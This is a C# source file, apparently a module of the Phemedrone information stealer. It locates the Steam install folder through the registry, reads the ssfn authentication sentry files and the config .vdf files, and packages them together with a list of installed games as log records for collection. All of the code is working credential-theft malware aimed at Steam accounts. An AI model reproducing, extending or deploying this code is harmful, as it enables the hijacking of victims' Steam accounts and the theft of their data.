using Phemedrone.Classes;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Text;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Steam : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;
        protected override string GetServiceName() => "Steam";

        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            
            var steamPath = NullableValue.Call(() =>
                Registry.GetValue(@"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null));
            if (steamPath == null) return array.ToArray();
            
            if (!Directory.Exists((string)steamPath)) return array.ToArray();

            foreach (var files in new List<string[]>
                     {
                         Directory.GetFiles((string)steamPath, "*ssfn*"),
                         Directory.GetFiles((string)steamPath + "\\config", "*.vdf")
                     })
            {
                foreach (var file in files)
                {
                    var content = NullableValue.Call(() => File.ReadAllBytes(file));
                    if (content == null) continue;
                    
                    array.Add(new LogRecord
                    {
                        Path = "Steam/" + file.Replace((string)steamPath + "\\", null),
                        Content = content
                    });
                }
            }
            array.AddRange(GetGames());
            return array.ToArray();
        }

        private static LogRecord[] GetGames()
        {
            var games = new List<string>();
            var array = new List<LogRecord>();

            try
            {
                using (var rkSteam = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"))
                {
                    if (rkSteam == null) return array.ToArray();

                    using (var rkApps = rkSteam.OpenSubKey("Apps"))
                    {
                        if (rkApps == null) return array.ToArray();

                        foreach (var gameId in rkApps.GetSubKeyNames())
                        {
                            using var app = rkApps.OpenSubKey(gameId);
                            
                            if (app == null) continue;

                            var name = app.GetValue("Name") as string ?? "Unknown";

                            games.Add($"Name: {name}\r\nGameID: {gameId}");
                        }
                    }
                }

                if (games.Count > 0)
                {
                    array.Add(new LogRecord
                    {
                        Path = "Steam/Games.txt",
                        Content = Encoding.UTF8.GetBytes(string.Join("\r\n\r\n", games))
                    });
                }
            }
            catch 
            {
                // ignored
            }

            return array.ToArray();
        }
    }
}